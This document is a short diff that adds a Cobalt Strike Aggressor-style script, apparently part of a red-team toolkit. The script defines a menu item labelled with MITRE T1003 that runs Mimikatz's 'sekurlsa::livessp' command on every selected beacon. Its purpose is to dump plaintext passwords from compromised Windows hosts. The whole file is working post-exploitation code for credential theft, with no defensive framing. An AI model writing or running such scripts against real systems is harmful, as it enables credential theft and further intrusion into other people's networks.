@@ -1,0 +1,12 @@
+item "Mimikatz LiveSSP passwords  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					livessp($bid);
+				}
+			}
+
+sub livessp{
+
+bmimikatz($1, "sekurlsa::livessp");
+
+}
